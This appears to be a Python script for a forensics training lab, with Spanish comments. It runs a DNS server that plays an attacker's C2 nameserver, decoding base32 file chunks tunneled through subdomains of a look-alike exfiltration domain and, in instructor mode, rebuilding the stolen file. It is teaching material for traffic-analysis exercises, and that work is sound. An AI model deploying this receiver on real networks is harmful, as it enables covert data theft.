#!/usr/bin/env python3
"""
Servidor DNS del laboratorio (doble papel, para que UNA captura contenga TODO
el tráfico DNS del endpoint):

  1. Resolutor "normal": responde consultas benignas con un A sintético, para
     que el tráfico de fondo parezca el de una estación de trabajo real.

  2. Nameserver del atacante (C2): las consultas al dominio de exfiltración
     llevan datos en base32 dentro de los subdominios.

Implementación real de DNS tunneling (MITRE ATT&CK T1071.004 / T1048.003).

NOTA DIDÁCTICA: por defecto NO reconstruye ni vuelca el fichero robado — esa
es precisamente la tarea del alumno a partir del PCAP. Para modo instructor,
arranca con INSTRUCTOR_MODE=1 y montará /pcaps para dejar la prueba.
"""
import base64
import os

from dnslib import RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver

EXFIL_DOMAIN = os.environ.get("EXFIL_DOMAIN", "sync-telemetry-cdn.net").rstrip(".")
INSTRUCTOR = os.environ.get("INSTRUCTOR_MODE", "0") == "1"
OUT_DIR = os.environ.get("OUT_DIR", "/pcaps")
SYNTHETIC_A = "93.184.216.34"
C2_A = "10.66.6.66"


def log(msg):
    print(msg, flush=True)


def b32decode(s):
    s = s.upper()
    pad = (-len(s)) % 8
    return base64.b32decode(s + "=" * pad)


class LabResolver(BaseResolver):
    def __init__(self):
        self.chunks = {}
        self.filename = None

    def _reassemble(self):
        if not INSTRUCTOR:
            log(f"[C2] fin de transferencia: {len(self.chunks)} fragmentos recibidos.")
            return
        ordered = "".join(self.chunks[k] for k in sorted(self.chunks))
        try:
            data = b32decode(ordered)
        except Exception as e:
            log(f"[C2] error base32: {e}")
            return
        os.makedirs(OUT_DIR, exist_ok=True)
        name = (self.filename or "exfiltrated.bin").replace("/", "_")
        out = os.path.join(OUT_DIR, f"RECOVERED_{name}")
        with open(out, "wb") as fh:
            fh.write(data)
        log(f"[C2][instructor] fichero reconstruido: {out} ({len(data)} bytes)")

    def _handle_exfil(self, labels):
        tag = labels[0].lower()
        payload = labels[1] if len(labels) > 1 else ""
        if tag == "init":
            try:
                self.filename = b32decode(payload).decode("utf-8", "replace")
            except Exception:
                self.filename = "exfiltrated.bin"
            self.chunks = {}
            log(f"[C2] inicio de exfiltración: '{self.filename}'")
        elif tag.startswith("d") and tag[1:].isdigit():
            self.chunks[int(tag[1:])] = payload
        elif tag == "fin":
            self._reassemble()

    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        name = str(qname).rstrip(".")
        if name.lower().endswith(EXFIL_DOMAIN.lower()):
            prefix = name[: -(len(EXFIL_DOMAIN) + 1)]
            try:
                self._handle_exfil(prefix.split("."))
            except Exception as e:
                log(f"[C2] error '{name}': {e}")
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(C2_A), ttl=60))
        else:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(SYNTHETIC_A), ttl=300))
        return reply


def main():
    log(f"[resolver] UDP/53 | exfil-domain={EXFIL_DOMAIN} | instructor={INSTRUCTOR}")
    server = DNSServer(LabResolver(), port=53, address="0.0.0.0")
    server.start_thread()
    try:
        while server.isAlive():
            server.thread.join(1)
    except KeyboardInterrupt:
        server.stop()


if __name__ == "__main__":
    main()
